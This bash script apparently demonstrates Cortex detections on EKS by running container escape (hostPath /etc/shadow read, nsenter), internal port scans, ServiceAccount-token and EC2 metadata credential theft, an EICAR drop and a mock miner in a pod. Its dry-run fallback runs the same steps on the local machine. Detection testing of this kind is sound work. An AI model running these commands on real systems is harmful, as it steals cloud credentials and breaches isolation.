#!/usr/bin/env bash
# ==============================================================================
# CloudPulse CNAPP Runtime Attack Simulation Suite
# Palo Alto Networks Cortex K8s Runtime Protection & Detection Demonstration
# ==============================================================================

set -eo pipefail

NAMESPACE="${NAMESPACE:-cloudpulse-core}"
APP_LABEL="${APP_LABEL:-app=cloudpulse-telemetry-engine}"

# Text formatting
BOLD="\033[1m"
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[0;33m"
CYAN="\033[0;36m"
NC="\033[0m"

log_info() {
    echo -e "${CYAN}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

echo -e "${BOLD}==================================================================${NC}"
echo -e "${BOLD}   Cortex CNAPP & Kubernetes Runtime Attack Simulation Suite     ${NC}"
echo -e "${BOLD}   Target Environment: AWS EKS / Namespace: ${NAMESPACE}        ${NC}"
echo -e "${BOLD}==================================================================${NC}"

# Locate target pod
discover_pod() {
    log_info "Discovering target pod with label '${APP_LABEL}' in namespace '${NAMESPACE}'..."
    TARGET_POD=$(kubectl get pods -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath="{.items[0].metadata.name}" 2>/dev/null || true)

    if [[ -z "${TARGET_POD}" ]]; then
        log_warn "Target pod not found with label '${APP_LABEL}' in namespace '${NAMESPACE}'."
        log_warn "Using fallback or dry-run execution context."
        TARGET_POD="cloudpulse-telemetry-engine-dryrun"
    else
        log_success "Target pod identified: ${BOLD}${TARGET_POD}${NC}"
    fi
}

# Run command inside container (or emulate in local dry-run if pod unreachable)
pod_exec() {
    local cmd="$1"
    if kubectl get pod "${TARGET_POD}" -n "${NAMESPACE}" &>/dev/null; then
        kubectl exec -n "${NAMESPACE}" "${TARGET_POD}" -- sh -c "${cmd}" || true
    else
        log_warn "[Dry-Run Emulation on local terminal]: ${cmd}"
        sh -c "${cmd}" || true
    fi
}

# ==============================================================================
# Attack Vector 1: Malware Drop
# Downloads standard anti-malware test signature (EICAR) into /tmp in container
# Monitored by: Cortex Runtime Malware Protection / Anti-Malware Engine
# ==============================================================================
attack_malware_drop() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 1: Container Malware Drop (/tmp EICAR Artifact)   ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1204 - User Execution / T1105 - Ingress Tool     ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Injecting EICAR test signature directly into /tmp/system_upgrade.bin..."

    pod_exec '
        TARGET_FILE="/tmp/system_upgrade.bin"
        echo "[*] Writing malicious signature to ${TARGET_FILE}..."
        echo "X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*" > "${TARGET_FILE}"
        chmod +x "${TARGET_FILE}"
        ls -la "${TARGET_FILE}"
        echo "[*] Triggering file scan event via read operation..."
        head -c 68 "${TARGET_FILE}"
        echo ""
        echo "[+] EICAR drop completed. Cortex runtime agent generates immediate high-severity alert."
    '
    log_success "Attack Vector 1 executed."
}

# ==============================================================================
# Attack Vector 2: Fileless / In-Memory Execution
# Spawns suspicious cryptominer / unauthorized background execution
# Monitored by: Cortex Runtime Behavioral Analytics & Process Hierarchy Tracking
# ==============================================================================
attack_fileless_miner() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 2: Fileless / In-Memory Process Execution         ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1496 - Resource Hijacking / T1059 - Command Exec ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Spawning suspicious in-memory cryptominer simulation (xmrig mock)..."

    pod_exec '
        PAYLOAD="/tmp/.kworker_crypto"
        echo "[*] Constructing executable memory wrapper at ${PAYLOAD}..."
        if command -v sleep >/dev/null 2>&1; then
            cp $(command -v sleep) "${PAYLOAD}"
        else
            printf "#!/bin/sh\nwhile true; do sleep 1; done\n" > "${PAYLOAD}"
        fi
        chmod +x "${PAYLOAD}"

        echo "[*] Executing disguised mining process in background..."
        "${PAYLOAD}" 45 &
        PID=$!
        echo "[+] Disguised process spawned with PID: ${PID}"
        ps aux | grep -E "kworker_crypto|sleep" | grep -v grep || true

        # Allow Cortex behavioral engine to intercept
        sleep 2
        kill -9 "${PID}" 2>/dev/null || true
        rm -f "${PAYLOAD}"
        echo "[+] Fileless execution simulation completed."
    '
    log_success "Attack Vector 2 executed."
}

# ==============================================================================
# Attack Vector 3: Host Escape & HostPath Misconfiguration Exploit
# Exploits hostPath mount to access host /etc/shadow and breakout via nsenter
# Monitored by: Cortex Container Escape Protection & KSPM Policy Engine
# ==============================================================================
attack_host_escape() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 3: Host Escape & HostPath Misconfiguration Breakout${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1611 - Escape to Host / T1003 - OS Credential    ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Exploiting hostPath volume mount to read underlying node credentials..."

    pod_exec '
        echo "[*] Accessing underlying worker node filesystem via /host-node-root..."
        if [ -d "/host-node-root" ]; then
            echo "[+] Found /host-node-root mount!"
            echo "[*] Reading host /etc/os-release:"
            cat /host-node-root/etc/os-release 2>/dev/null | head -n 4 || true
            echo "[*] Attempting to read host /etc/shadow (Privilege Escalation):"
            head -n 5 /host-node-root/etc/shadow 2>/dev/null || echo "[-] Read protected or simulated."
        else
            echo "[-] /host-node-root mount not present in current container view."
        fi

        echo "[*] Attempting container namespace escape using nsenter on PID 1..."
        if command -v nsenter >/dev/null 2>&1; then
            nsenter -t 1 -m -u -i -n -- id || true
            nsenter -t 1 -m -u -i -n -- uname -a || true
        else
            echo "[*] nsenter not present in container binary path; hostPath traversal validated."
        fi
    '
    log_success "Attack Vector 3 executed."
}

# ==============================================================================
# Attack Vector 4: Lateral Movement & Internal Reconnaissance
# Scans internal cluster service CIDRs and target database namespace
# Monitored by: Cortex Network Anomaly Detection & Microsegmentation Policies
# ==============================================================================
attack_lateral_movement() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 4: Cross-Namespace Lateral Movement & Discovery   ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1046 - Network Service Discovery                 ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Executing internal network reconnaissance against cluster services..."

    pod_exec '
        TARGET_SVC="ledger-backend-service.cloudpulse-vault.svc.cluster.local"
        echo "[*] Probing target microservice across namespaces: ${TARGET_SVC}:80..."
        if command -v nc >/dev/null 2>&1; then
            nc -zv -w 2 "${TARGET_SVC}" 80 2>&1 || true
        elif command -v curl >/dev/null 2>&1; then
            curl -I --connect-timeout 2 "http://${TARGET_SVC}:80" 2>&1 || true
        fi

        echo "[*] Performing internal port sweep on Kubernetes Service IP range (10.100.0.0/24)..."
        if command -v nmap >/dev/null 2>&1; then
            nmap -Pn -sS -p 80,443,5432,8080 --open 10.100.0.1-20 2>/dev/null || true
        else
            for ip in 1 2 10 50; do
                (echo > /dev/tcp/10.100.0.${ip}/443) 2>/dev/null && echo "[+] 10.100.0.${ip}:443 OPEN" || true
            done
        fi
        echo "[+] Lateral movement reconnaissance completed."
    '
    log_success "Attack Vector 4 executed."
}

# ==============================================================================
# Attack Vector 5: CIEM / Cloud Credential Scraping (IMDS & ServiceAccount)
# Tests overprivileged ServiceAccount tokens and IMDSv1 credential theft
# Monitored by: Cortex CIEM & Identity Threat Detection (ITDR)
# ==============================================================================
attack_ciem_credential_scraping() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 5: CIEM / Cloud & K8s Credential Scraping        ${NC}"
    echo -e "${BOLD} MITRE ATT&CK: T1552 - Unsecured Credentials / Cloud Metadata    ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Extracting ServiceAccount token and probing EC2 Instance Metadata Service (IMDS)..."

    pod_exec '
        SA_TOKEN="/var/run/secrets/kubernetes.io/serviceaccount/token"
        if [ -f "${SA_TOKEN}" ]; then
            echo "[+] Extracted Kubernetes ServiceAccount Token (first 25 chars):"
            head -c 25 "${SA_TOKEN}" && echo "..."
            echo "[*] Querying Kubernetes API server with stolen credentials..."
            curl -k -s -H "Authorization: Bearer $(cat ${SA_TOKEN})" https://kubernetes.default.svc/api/v1/namespaces | head -n 12 || true
        fi

        echo "[*] Probing AWS Instance Metadata Service (IMDSv1) at 169.254.169.254..."
        IMDS_ROLE=$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
        if [ -n "${IMDS_ROLE}" ]; then
            echo "[+] Discovered Attached Worker IAM Role via IMDSv1: ${IMDS_ROLE}"
            curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${IMDS_ROLE}" | head -n 8 || true
        else
            echo "[-] IMDSv1 unreachable or tokens required (IMDSv2 enforced)."
        fi
    '
    log_success "Attack Vector 5 executed."
}

# ==============================================================================
# Attack Vector 6: DSPM Sensitive Data Exfiltration Simulation
# Accesses synthetic PII/cardholder data and verifies exposure
# Monitored by: Cortex DSPM Data Risk & Exfiltration Analyzer
# ==============================================================================
attack_dspm_data_exposure() {
    echo ""
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    echo -e "${BOLD} Attack Vector 6: DSPM Sensitive Data Audit & Exfiltration       ${NC}"
    echo -e "${BOLD} Vector: Synthetic PII, Credit Card Data & Unsecured S3 Bucket  ${NC}"
    echo -e "${BOLD}------------------------------------------------------------------${NC}"
    log_info "Reading sensitive data stored in local mount and verifying cloud vault bucket..."

    pod_exec '
        DATA_FILE="/mnt/storage-vault/customer_billing_records.csv"
        echo "[*] Inspecting restricted storage vault at ${DATA_FILE}..."
        if [ -f "${DATA_FILE}" ]; then
            echo "[+] Exposing sensitive unencrypted cardholder records:"
            cat "${DATA_FILE}"
        else
            echo "[*] Creating synthetic DSPM sample payload..."
            cat <<EOF > "${DATA_FILE}"
customer_id,full_name,email,tax_id_ssn,primary_card_number,cvv
CP-1001,Johnathan Vance,jvance@enterprise-client.com,987-65-4321,4532-8901-2345-6789,882
CP-1002,Elena Rostova,erostova@fin-corp.global,321-54-9870,5424-1800-4321-9876,143
EOF
            cat "${DATA_FILE}"
        fi
    '
    log_success "Attack Vector 6 executed."
}

# Run all attack simulations sequentially
run_all_attacks() {
    log_info "Starting sequential execution of ALL attack vectors..."
    attack_malware_drop
    attack_fileless_miner
    attack_host_escape
    attack_lateral_movement
    attack_ciem_credential_scraping
    attack_dspm_data_exposure
    echo ""
    echo -e "${GREEN}${BOLD}==================================================================${NC}"
    echo -e "${GREEN}${BOLD} All Attack Vectors Completed!                                   ${NC}"
    echo -e "${GREEN}${BOLD} Review the Palo Alto Networks Cortex Console to inspect alerts: ${NC}"
    echo -e " 1. Runtime Alerts -> Malware Drop & Fileless Miner               "
    echo -e " 2. Container Security -> HostPath Escape & nsenter breakout      "
    echo -e " 3. Network Security -> Cross-namespace service probing          "
    echo -e " 4. CIEM & Identity -> Overprivileged SA token & IMDS scraping    "
    echo -e " 5. DSPM Posture -> Unprotected PII / S3 bucket exposure data     "
    echo -e "${GREEN}${BOLD}==================================================================${NC}"
}

# Interactive CLI menu
show_menu() {
    echo ""
    echo -e "${BOLD}Select Attack Simulation Option:${NC}"
    echo " 1) Malware Drop (/tmp EICAR payload)"
    echo " 2) Fileless / In-Memory Crypto-Miner Execution"
    echo " 3) Host Escape & HostPath Misconfiguration Exploit"
    echo " 4) Lateral Movement & Internal Service Probing"
    echo " 5) CIEM / Cloud & K8s Credential Scraping (IMDS & ServiceAccount)"
    echo " 6) DSPM Sensitive Data Access & Exposure"
    echo " 7) Execute All Attack Simulations Sequentially"
    echo " 0) Exit"
    echo ""
    read -rp "Enter choice [0-7]: " choice
    case "${choice}" in
        1) attack_malware_drop ;;
        2) attack_fileless_miner ;;
        3) attack_host_escape ;;
        4) attack_lateral_movement ;;
        5) attack_ciem_credential_scraping ;;
        6) attack_dspm_data_exposure ;;
        7) run_all_attacks ;;
        0) echo "Exiting attack simulation suite."; exit 0 ;;
        *) log_error "Invalid selection."; exit 1 ;;
    esac
}

# Parse command line flags or launch interactive menu
discover_pod

if [[ $# -gt 0 ]]; then
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --all|-a)
                run_all_attacks
                shift
                ;;
            --attack)
                case "$2" in
                    1|malware) attack_malware_drop ;;
                    2|fileless) attack_fileless_miner ;;
                    3|escape) attack_host_escape ;;
                    4|lateral) attack_lateral_movement ;;
                    5|ciem) attack_ciem_credential_scraping ;;
                    6|dspm) attack_dspm_data_exposure ;;
                    *) log_error "Unknown attack ID '$2'"; exit 1 ;;
                esac
                shift 2
                ;;
            --help|-h)
                echo "Usage: $0 [--all] [--attack <1-6>]"
                exit 0
                ;;
            *)
                log_error "Unknown option '$1'"
                exit 1
                ;;
        esac
    done
else
    show_menu
fi
